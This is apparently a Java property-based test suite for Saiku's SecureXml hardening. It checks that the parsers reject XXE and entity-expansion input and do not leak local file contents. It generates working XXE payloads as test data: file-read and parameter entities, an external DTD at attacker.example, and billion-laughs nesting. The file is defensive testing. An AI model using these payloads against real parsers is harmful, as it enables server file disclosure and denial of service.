/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.proptest;

import static dev.hegel.Generators.fromRegex;
import static dev.hegel.Generators.integers;
import static dev.hegel.Generators.sampledFrom;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.fail;

import dev.hegel.HegelTest;
import dev.hegel.TestCase;
import java.io.ByteArrayInputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.saiku.service.util.xml.SecureXml;
import org.xml.sax.InputSource;

/**
 * Property-based tests for {@link SecureXml} — the XML hardening applied wherever Saiku parses
 * user-influenceable XML: saved {@code .sds} data sources, uploaded Mondrian schemas, saved-query
 * XML, SVG fed to the PDF exporter.
 *
 * <p>XXE is not one payload, it is a family. The classic file-read entity is the one everybody
 * writes a test for; the ones that actually get through in the wild are the variants — parameter
 * entities, an external DTD subset with no inline entity at all, nested expansion, a different
 * scheme. So the payload SHAPE is generated here rather than hand-picked, and the invariant is
 * asserted against every hardened entry point at once:
 *
 * <blockquote>
 * no document carrying a DOCTYPE is ever parsed, and no local file's contents ever appear in a
 * parse result.
 * </blockquote>
 *
 * <p>The second clause is the one that matters. Rejection is the mechanism; non-disclosure is the
 * actual security goal, and it is asserted directly against a real file on disk.
 */
class SecureXmlPropertyTest {

    /** Written to disk so a successful XXE would have something real to exfiltrate. */
    private static final String MARKER = "SECRET-MARKER-XXE-3f9a2b";

    private static Path secretFile() throws Exception {
        Path p = Files.createTempFile("saiku-xxe-secret", ".txt");
        p.toFile().deleteOnExit();
        Files.writeString(p, MARKER, StandardCharsets.UTF_8);
        return p;
    }

    /** The hardened entry points, each reduced to "parse this string". */
    private enum Parser {
        SAX_FACTORY,
        DOCUMENT_BUILDER,
        JDOM_SAX_BUILDER;

        void parse(String xml) throws Exception {
            switch (this) {
                case SAX_FACTORY -> SecureXml.secureSaxParserFactory()
                        .newSAXParser()
                        .getXMLReader()
                        .parse(new InputSource(new StringReader(xml)));
                case DOCUMENT_BUILDER -> SecureXml.secureDocumentBuilder()
                        .parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
                case JDOM_SAX_BUILDER -> SecureXml.secureSaxBuilder().build(new StringReader(xml));
            }
        }

        /** Parse and return whatever textual content the parser produced, or null if it refused. */
        String parseToText(String xml) {
            try {
                switch (this) {
                    case DOCUMENT_BUILDER -> {
                        var doc = SecureXml.secureDocumentBuilder()
                                .parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
                        return doc.getDocumentElement().getTextContent();
                    }
                    case JDOM_SAX_BUILDER -> {
                        var doc = SecureXml.secureSaxBuilder().build(new StringReader(xml));
                        return doc.getRootElement().getValue();
                    }
                    default -> {
                        parse(xml);
                        return "";
                    }
                }
            } catch (Exception refused) {
                return null;
            }
        }
    }

    private static final List<Parser> PARSERS = List.of(Parser.values());

    /** URI schemes an attacker reaches for. */
    private static final List<String> SCHEMES =
            List.of("file://", "http://attacker.example/", "ftp://attacker.example/");

    /**
     * A DOCTYPE declaring an external entity — the classic XXE — is refused by every hardened
     * parser, whatever the entity name, element name or scheme.
     */
    @HegelTest
    void everyParserRefusesAnExternalEntityDoctype(TestCase tc) throws Exception {
        String entity = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "entity");
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        String scheme = tc.draw(sampledFrom(SCHEMES), "scheme");
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        String target = scheme.startsWith("file") ? "file://" + secretFile() : scheme + "x";
        String xml = "<?xml version=\"1.0\"?><!DOCTYPE " + root + " [<!ENTITY " + entity + " SYSTEM \"" + target
                + "\">]><" + root + ">&" + entity + ";</" + root + ">";
        tc.note(xml);

        try {
            parser.parse(xml);
            fail(parser + " parsed an external-entity DOCTYPE: " + xml);
        } catch (Exception expected) {
            // refused — the hardening did its job
        }
    }

    /** A PARAMETER entity (the variant that slips past naive "block &ent;" filters) is refused too. */
    @HegelTest
    void everyParserRefusesAParameterEntityDoctype(TestCase tc) throws Exception {
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        String entity = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "entity");
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        String xml = "<?xml version=\"1.0\"?><!DOCTYPE " + root + " [<!ENTITY % " + entity + " SYSTEM \"file://"
                + secretFile() + "\"> %" + entity + ";]><" + root + "/>";
        tc.note(xml);

        try {
            parser.parse(xml);
            fail(parser + " parsed a parameter-entity DOCTYPE: " + xml);
        } catch (Exception expected) {
            // refused
        }
    }

    /** An external DTD subset with no inline entity at all — no "[" to pattern-match on. */
    @HegelTest
    void everyParserRefusesAnExternalDtdSubset(TestCase tc) throws Exception {
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        String xml = "<?xml version=\"1.0\"?><!DOCTYPE " + root + " SYSTEM \"http://attacker.example/evil.dtd\"><"
                + root + "/>";
        tc.note(xml);

        try {
            parser.parse(xml);
            fail(parser + " parsed an external DTD subset: " + xml);
        } catch (Exception expected) {
            // refused
        }
    }

    /**
     * Entity-expansion DoS ("billion laughs"). Nesting depth is generated, so this covers the
     * shallow variants a depth-limit-only defence would let through.
     */
    @HegelTest
    void everyParserRefusesNestedEntityExpansion(TestCase tc) throws Exception {
        int depth = tc.draw(integers().min(2).max(8), "depth");
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        StringBuilder dtd = new StringBuilder("<!ENTITY e0 \"lol\">");
        for (int i = 1; i <= depth; i++) {
            dtd.append("<!ENTITY e").append(i).append(" \"");
            for (int j = 0; j < 10; j++) {
                dtd.append("&e").append(i - 1).append(";");
            }
            dtd.append("\">");
        }
        String xml = "<?xml version=\"1.0\"?><!DOCTYPE lolz [" + dtd + "]><lolz>&e" + depth + ";</lolz>";

        try {
            parser.parse(xml);
            fail(parser + " parsed a nested entity expansion at depth " + depth);
        } catch (Exception expected) {
            // refused
        }
    }

    /**
     * The security goal itself, stated independently of the mechanism: however the payload is
     * shaped, a real file's contents must never end up in a parse result.
     */
    @HegelTest
    void noPayloadShapeEverDisclosesFileContents(TestCase tc) throws Exception {
        Path secret = secretFile();
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        String entity = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "entity");
        int shape = tc.draw(integers().min(0).max(2), "shape");
        Parser parser = tc.draw(sampledFrom(List.of(Parser.DOCUMENT_BUILDER, Parser.JDOM_SAX_BUILDER)), "parser");

        String xml =
                switch (shape) {
                    case 0 -> "<!DOCTYPE " + root + " [<!ENTITY " + entity + " SYSTEM \"file://" + secret + "\">]><"
                            + root + ">&" + entity + ";</" + root + ">";
                    case 1 -> "<!DOCTYPE " + root + " [<!ENTITY % " + entity + " SYSTEM \"file://" + secret + "\"> %"
                            + entity + ";]><" + root + "/>";
                    default -> "<!DOCTYPE " + root + " [<!ENTITY " + entity + " SYSTEM \"file://" + secret + "\">]><"
                            + root + " attr=\"&" + entity + ";\"/>";
                };
        tc.note(xml);

        String text = parser.parseToText(xml);

        if (text != null) {
            assertFalse(text.contains(MARKER), parser + " disclosed file contents via: " + xml);
        }
    }

    /**
     * No false positives. Ordinary XML — the overwhelming majority of what Saiku parses — must
     * still parse cleanly, or the hardening has broken saved queries and schema uploads.
     */
    @HegelTest
    void ordinaryXmlStillParses(TestCase tc) {
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        String child = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "child");
        String value = tc.draw(fromRegex("[a-zA-Z0-9 ._-]{0,30}"), "value");
        String attr = tc.draw(fromRegex("[a-z][a-z0-9]{0,6}"), "attr");
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><" + root + " " + attr + "=\"" + value + "\"><" + child
                + ">" + value + "</" + child + "></" + root + ">";
        tc.note(xml);

        assertDoesNotThrow(() -> parser.parse(xml), "hardening rejected ordinary XML: " + xml);
    }

    /** Built-in XML entities keep working — they need no external resolution. */
    @HegelTest
    void builtInEntitiesStillResolve(TestCase tc) {
        String root = tc.draw(fromRegex("[a-z][a-z0-9]{0,8}"), "root");
        String builtIn = tc.draw(sampledFrom(List.of("&amp;", "&lt;", "&gt;", "&quot;", "&apos;")), "builtIn");

        String xml = "<" + root + ">" + builtIn + "</" + root + ">";

        assertDoesNotThrow(() -> Parser.DOCUMENT_BUILDER.parse(xml), "hardening rejected a built-in entity: " + xml);
    }

    /** Every factory method returns a usable, hardened instance rather than null. */
    @HegelTest
    void everyFactoryMethodProducesAUsableParser(TestCase tc) {
        Parser parser = tc.draw(sampledFrom(PARSERS), "parser");

        assertDoesNotThrow(() -> {
            switch (parser) {
                case SAX_FACTORY -> assertNotNull(
                        SecureXml.secureSaxParserFactory().newSAXParser());
                case DOCUMENT_BUILDER -> assertNotNull(SecureXml.secureDocumentBuilder());
                case JDOM_SAX_BUILDER -> assertNotNull(SecureXml.secureSaxBuilder());
            }
        });
    }
}
